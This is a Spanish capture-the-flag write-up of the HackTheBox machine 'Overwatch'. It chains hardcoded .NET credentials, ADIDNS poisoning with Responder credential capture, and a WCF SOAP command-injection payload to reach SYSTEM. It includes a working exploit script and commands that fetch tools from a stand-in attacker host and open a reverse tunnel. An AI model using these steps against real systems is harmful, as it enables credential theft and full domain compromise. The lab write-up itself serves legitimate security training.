# Overwatch — HackTheBox Writeup (Medium)

**IP:** 10.129.XXX.XXX
**OS:** Windows Server 2022 (Build 20348)
**Dificultad:** Medium
**Fecha:** 2026-03-06

---

## Información General

| Campo | Valor |
|-------|-------|
| **Máquina** | Overwatch |
| **Dificultad** | Medium |
| **OS** | Windows Server 2022 |
| **IP** | 10.129.XXX.XXX |
| **Temática** | Active Directory, MSSQL, DNS Poisoning, WCF Command Injection |
| **user.txt** | `99fe2c23************************` |
| **root.txt** | `deaef96a************************` |

---

## Resumen Ejecutivo

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | Nmap, SMB enumeration | DC con MSSQL (6520), WCF interno (8000 filtrado), SMB share `software$` anónimo |
| Foothold (MSSQL) | Credenciales hardcodeadas en .NET app decompilada | Acceso MSSQL como `sqlsvc` con db_owner |
| User | DNS Poisoning (ADIDNS) + Linked Server MSSQL → captura de creds en claro | WinRM como `sqlmgmt` |
| Root | Chisel tunnel + WCF SOAP KillProcess command injection | RCE como `NT AUTHORITY\SYSTEM` |

---

## Fase 1: Reconocimiento

### 1.1 Escaneo Nmap

```bash
nmap -sC -sV -p- 10.129.XXX.XXX -T4 --min-rate=1000
```

```
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wts-s      Microsoft Windows Remote Desktop Services
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0
6520/tcp  open     ms-sql-s      Microsoft SQL Server 2022 Express
8000/tcp  filtered http-alt
9389/tcp  open     mc-nmf        .NET Message Framing
```

**Hallazgos clave:**
- **Domain Controller** para `overwatch.htb`
- **MSSQL** en puerto no estándar **6520** (SQL Server 2022 Express)
- **Puerto 8000 FILTRADO** — accesible solo desde localhost (WCF service)
- **WinRM** habilitado (5985)

```bash
echo "10.129.XXX.XXX overwatch.htb S200401.overwatch.htb S200401" >> /etc/hosts
```

### 1.2 Enumeración SMB

```bash
smbclient -L //10.129.XXX.XXX -N
```

Se descubre un share `software$` accesible con acceso anónimo/guest:

```bash
smbclient //10.129.XXX.XXX/software$ -N
smb: \> dir
  overwatch.exe
  overwatch.exe.config
```

Se descargan ambos archivos para análisis.

### 1.3 Enumeración de Usuarios (RID Brute Force)

```bash
crackmapexec smb 10.129.XXX.XXX -u '' -p '' --rid-brute 10000
```

Se enumeran **~105 usuarios de dominio**, incluyendo:
- `sqlsvc` — cuenta de servicio SQL
- `sqlmgmt` — cuenta de gestión SQL
- `Adam.Russell` — Domain Admin

---

## Fase 2: Análisis de la Aplicación .NET

### 2.1 Decompilación con dnSpy/ILSpy

El binario `overwatch.exe` es una aplicación .NET de monitorización con servicio WCF. La decompilación revela:

**Interfaz WCF `IMonitoringService`:**

```csharp
[ServiceContract]
public interface IMonitoringService
{
    [OperationContract] void StartMonitoring();
    [OperationContract] void StopMonitoring();
    [OperationContract] void KillProcess(string processName);
}
```

**Vulnerabilidad de Command Injection en `KillProcess`:**

```csharp
public void KillProcess(string processName)
{
    string script = "Stop-Process -Name " + processName + " -Force";
    // ↑ Concatenación directa — INYECCIÓN DE COMANDOS
    using (PowerShell ps = PowerShell.Create())
    {
        ps.AddScript(script);
        ps.Invoke();
    }
}
```

**Credenciales SQL hardcodeadas:**

```csharp
string connStr = "Server=localhost;Database=SecurityLogs;" +
                 "User Id=sqlsvc;Password=XXXXXXXXXXXXXXXXX;";
```

**Binding WCF:**

```xml
<baseAddresses>
  <add baseAddress="http://overwatch.htb:8000/MonitorService"/>
</baseAddresses>
```

El servicio escucha en `http://overwatch.htb:8000/MonitorService` con `basicHttpBinding`.

### 2.2 Hallazgos del Análisis

| Hallazgo | Detalle |
|----------|---------|
| Credenciales SQL | `sqlsvc:XXXXXXXXXX` (hardcoded) |
| Command Injection | `KillProcess` concatena input en PowerShell Runspace |
| SQL Injection | `LogEvent` y `CheckEdgeHistory` usan concatenación de strings |
| WCF Endpoint | `http://overwatch.htb:8000/MonitorService` (solo localhost) |

---

## Fase 3: Acceso MSSQL

### 3.1 Conexión

La conexión string hardcodeada usa SQL Auth, pero el servidor tiene **LoginMode=1** (Windows Auth Only). Sin embargo, las credenciales sirven para autenticación Windows:

```bash
python3 -c "
import pymssql
conn = pymssql.connect(server='10.129.XXX.XXX', port=6520,
                       user='overwatch\\\\sqlsvc', password='XXXXXXXXXX')
cursor = conn.cursor()
cursor.execute('SELECT SYSTEM_USER, DB_NAME()')
print(cursor.fetchone())
"
```

Resultado: Acceso como `OVERWATCH\sqlsvc` con **db_owner** en base de datos `overwatch`.

### 3.2 Enumeración MSSQL

Todas las vías de escalada estándar están **bloqueadas**:

| Técnica | Estado |
|---------|--------|
| `xp_cmdshell` | Bloqueado (`sp_configure` denied) |
| CLR Assemblies | Bloqueado |
| `sp_OACreate` | Bloqueado |
| `TRUSTWORTHY` DB | Deshabilitado |
| `OPENROWSET BULK` | Bloqueado |
| SQL Agent | Deshabilitado |
| Linked Servers (exec) | Sin permisos |
| External Scripts | Bloqueado |
| `xp_regread/write` | Bloqueado |

**Lo que SÍ funciona:**
- `xp_dirtree` — enumeración de filesystem + NTLM trigger
- `BACKUP DATABASE` — escritura a paths como `C:\Windows\Temp\`
- **Service Broker activation** — procedimientos almacenados activados por colas

### 3.3 Descubrimiento de Linked Server SQL07

```sql
SELECT * FROM sys.servers;
```

Existe un linked server llamado **SQL07** configurado para conectar automáticamente.

---

## Fase 4: DNS Poisoning → Captura de Credenciales (user.txt)

### 4.1 Estrategia

El linked server `SQL07` intenta resolver por DNS. Como `sqlsvc` tiene permisos de escritura en la zona DNS de Active Directory (ADIDNS), podemos:

1. Crear un registro DNS `SQL07 → nuestra IP`
2. Forzar a MSSQL a conectar al linked server
3. Capturar las credenciales con **Responder**

### 4.2 DNS Poisoning con dnstool.py

```bash
# Clonar krbrelayx para obtener dnstool.py
git clone https://github.com/dirkjanm/krbrelayx.git

# Crear registro A para SQL07 apuntando a nuestra IP
python3 krbrelayx/dnstool.py -u 'overwatch.htb\sqlsvc' -p 'XXXXXXXXXX' \
    -a add -r SQL07.overwatch.htb -d ATTACKER_IP \
    10.129.XXX.XXX

# Verificar
dig @10.129.XXX.XXX SQL07.overwatch.htb
# → SQL07.overwatch.htb.  600  IN  A  ATTACKER_IP
```

### 4.3 Captura con Responder

```bash
sudo responder -I tun0 -v
```

### 4.4 Trigger de Conexión al Linked Server

Desde MSSQL, forzar una consulta al linked server SQL07:

```sql
EXEC sp_testlinkedserver 'SQL07';
```

O mediante las colas de Service Broker previamente configuradas que activan procedimientos que consultan SQL07.

### 4.5 Captura de Credenciales en Texto Claro

Responder captura las credenciales **en texto claro** porque MSSQL intenta autenticarse al "SQL07" (que ahora es nuestra máquina):

```
[MSSQL] Cleartext Client   : 10.129.XXX.XXX
[MSSQL] Cleartext Username  : sqlmgmt
[MSSQL] Cleartext Password  : XXXXXXXXXXXXXXXXX
```

> **¿Por qué en texto claro?** MSSQL usa SQL Authentication para linked servers. Al conectar a nuestro Responder, envía user/password en claro como parte del protocolo TDS.

### 4.6 WinRM como sqlmgmt

`sqlmgmt` pertenece al grupo **Remote Management Users**, lo que permite WinRM:

```bash
evil-winrm -i 10.129.XXX.XXX -u sqlmgmt -p 'XXXXXXXXXXXXXXXXX'

*Evil-WinRM* PS> type C:\Users\sqlmgmt\Desktop\user.txt
99fe2c23************************
```

### User Flag: `99fe2c23************************`

---

## Fase 5: Escalada de Privilegios → SYSTEM (root.txt)

### 5.1 Estrategia

El servicio `overwatch.exe` corre como **NT AUTHORITY\SYSTEM** (registrado vía NSSM como servicio de Windows). Su endpoint WCF escucha en `localhost:8000`. La función `KillProcess` tiene una vulnerabilidad de **command injection** vía PowerShell Runspace.

El puerto 8000 está **filtrado externamente**, así que necesitamos acceder desde el target. Opciones:
- (a) Enviar SOAP request desde PowerShell en la sesión WinRM
- (b) Crear tunnel con chisel y enviar desde Kali

### 5.2 Chisel Tunnel (Reverse Port Forward)

**En Kali (servidor chisel):**

```bash
./chisel server --reverse -p 9999
# 2026/03/06 server: Listening on http://0.0.0.0:9999
```

**En el target (via evil-winrm):**

```powershell
# Descargar chisel.exe desde nuestro HTTP server
Invoke-WebRequest -Uri http://ATTACKER_IP:8888/chisel.exe -OutFile C:\Windows\Temp\chisel.exe

# Ejecutar cliente chisel
Start-Process -FilePath C:\Windows\Temp\chisel.exe `
    -ArgumentList "client ATTACKER_IP:9999 R:8000:localhost:8000" -WindowStyle Hidden
```

El servidor chisel confirma la conexión:

```
server: session#1: tun: proxy#R:8000=>localhost:8000: Listening
```

> **Nota:** En este caso el tunnel puede ser terminado por AV/AMSI. La alternativa más fiable es enviar el SOAP request directamente desde PowerShell en el target (ver 5.3).

### 5.3 SOAP KillProcess Injection

Se crea un script PowerShell para enviar el SOAP request con la inyección de comandos:

**Exploit script (`exploit.ps1`):**

```powershell
$body = '<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>test -Force; whoami | Out-File C:\Windows\Temp\out.txt -Encoding ascii; #</processName></KillProcess></s:Body></s:Envelope>'
$headers = @{
    "SOAPAction"   = "http://tempuri.org/IMonitoringService/KillProcess"
    "Content-Type" = "text/xml; charset=utf-8"
}
try {
    $r = Invoke-WebRequest -Uri http://localhost:8000/MonitorService `
         -Method POST -Body $body -Headers $headers -UseBasicParsing
    $r.StatusCode
} catch {
    $_.Exception.Message
}
Start-Sleep -Seconds 2
if (Test-Path C:\Windows\Temp\out.txt) {
    Get-Content C:\Windows\Temp\out.txt
} else {
    "out.txt not found"
}
```

**Desglose del payload:**

```
Input processName: test -Force; whoami | Out-File C:\Windows\Temp\out.txt -Encoding ascii; #

PowerShell ejecuta:
  Stop-Process -Name test -Force; whoami | Out-File C:\Windows\Temp\out.txt -Encoding ascii; # -Force
                                          ↑ Nuestro comando inyectado         ↑ # comenta el resto
```

### 5.4 Ejecución y Verificación

```powershell
# Descargar y ejecutar desde el target
Invoke-WebRequest -Uri http://ATTACKER_IP:8888/exploit.ps1 -OutFile C:\Windows\Temp\exploit.ps1
C:\Windows\Temp\exploit.ps1
```

**Resultado:**

```
200
nt authority\system
```

**¡Confirmado: ejecución como SYSTEM!**

### 5.5 Obtener root.txt

Se modifica el payload para leer la flag:

```powershell
$body = '<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>test -Force; type C:\Users\Administrator\Desktop\root.txt | Out-File C:\Windows\Temp\out.txt -Encoding ascii; #</processName></KillProcess></s:Body></s:Envelope>'
# ... mismo código de envío ...
```

**Resultado:**

```
200
deaef96a************************
```

### Root Flag: `deaef96a************************`

---

## Credenciales Recopiladas

| Servicio | Usuario | Contraseña | Uso |
|----------|---------|------------|-----|
| MSSQL (Windows Auth) | sqlsvc | `XXXXXXXXXX` | Acceso MSSQL con db_owner (hardcoded en .NET app) |
| WinRM | sqlmgmt | `XXXXXXXXXX` | Capturado via Responder (DNS poisoning + linked server) |
| Domain Admin | Adam.Russell | — | Identificado pero no explotado |

---

## Diagrama de la Cadena de Ataque

```
SMB Share (software$) anónimo
  └── Descargar overwatch.exe + overwatch.exe.config
       │
       ▼
  Decompilación .NET (dnSpy/ILSpy)
  ├── Credenciales hardcodeadas: sqlsvc:XXXXXXXX
  ├── Command Injection en KillProcess (PowerShell Runspace)
  └── WCF endpoint: localhost:8000/MonitorService
       │
       ▼
  MSSQL Access (Windows Auth, port 6520)
  └── db_owner en "overwatch" DB
       │
       ▼
  Enumeración MSSQL
  ├── Todo bloqueado (xp_cmdshell, CLR, OLE, etc.)
  └── Linked Server "SQL07" descubierto
       │
       ▼
  DNS Poisoning (ADIDNS via dnstool.py)
  └── SQL07.overwatch.htb → ATTACKER_IP
       │
       ▼
  Trigger conexión linked server SQL07
  └── MSSQL intenta conectar a nuestra IP
       │
       ▼
  Responder captura credenciales MSSQL en claro
  └── sqlmgmt:XXXXXXXXXXXXXXX
       │
       ▼
  WinRM como sqlmgmt
  └── ★ user.txt
       │
       ▼
  SOAP Request a localhost:8000 (WCF MonitorService)
  └── KillProcess command injection
       │
       ▼
  PowerShell Runspace ejecuta como NT AUTHORITY\SYSTEM
  └── ★ root.txt
```

---

## Lecciones y Técnicas Clave

1. **Credenciales hardcodeadas en binarios .NET** — La decompilación de aplicaciones .NET es trivial con herramientas como dnSpy/ILSpy. Nunca almacenar credenciales en el código fuente.

2. **ADIDNS Poisoning** — Por defecto, los usuarios autenticados de AD pueden crear registros DNS en la zona integrada de Active Directory. Esto permite redirigir tráfico de servicios internos (como linked servers SQL) hacia una máquina controlada por el atacante.

3. **MSSQL Linked Server + Responder** — Cuando MSSQL se conecta a un linked server usando SQL Authentication, las credenciales viajan en texto claro en el protocolo TDS. Al redirigir el DNS del linked server, Responder puede capturar estas credenciales sin crackear hashes.

4. **WCF SOAP Command Injection** — La concatenación de input de usuario en scripts de PowerShell Runspace permite inyección de comandos. El carácter `;` separa comandos y `#` comenta el resto de la línea.

5. **Servicios internos como vector de escalada** — Servicios que escuchan solo en localhost pueden ser explotados desde una sesión comprometida. Herramientas como chisel permiten crear tunnels para acceder a estos servicios, o se pueden invocar directamente desde PowerShell en la sesión WinRM.

6. **NSSM + servicios como SYSTEM** — Aplicaciones registradas como servicios Windows via NSSM corren típicamente como `NT AUTHORITY\SYSTEM`. Una vulnerabilidad en el servicio equivale a compromiso total del sistema.

---

## Herramientas Utilizadas

| Herramienta | Propósito |
|-------------|-----------|
| nmap | Escaneo de puertos y enumeración de servicios |
| smbclient / crackmapexec | Enumeración SMB, descarga de archivos, RID brute force |
| dnSpy / ILSpy | Decompilación de binario .NET |
| pymssql | Conexión y enumeración MSSQL desde Python |
| dnstool.py (krbrelayx) | Manipulación de registros ADIDNS |
| Responder | Captura de credenciales MSSQL en claro |
| evil-winrm | Shell WinRM para acceso como sqlmgmt |
| chisel | Tunnel TCP reverso para acceso a puerto 8000 interno |
| curl / PowerShell IWR | Envío de SOAP requests para explotar KillProcess |

---

## Flags

```
User: 99fe2c23************************
Root: deaef96a************************
```

---

*Writeup por C4sh3R — HackTheBox Overwatch (Medium)*
*Cadena de ataque: SMB Anon → .NET Decompile → MSSQL db_owner → ADIDNS Poisoning → Responder Cred Capture → WinRM → WCF SOAP Injection → SYSTEM*
*Completada: 6 de marzo de 2026*
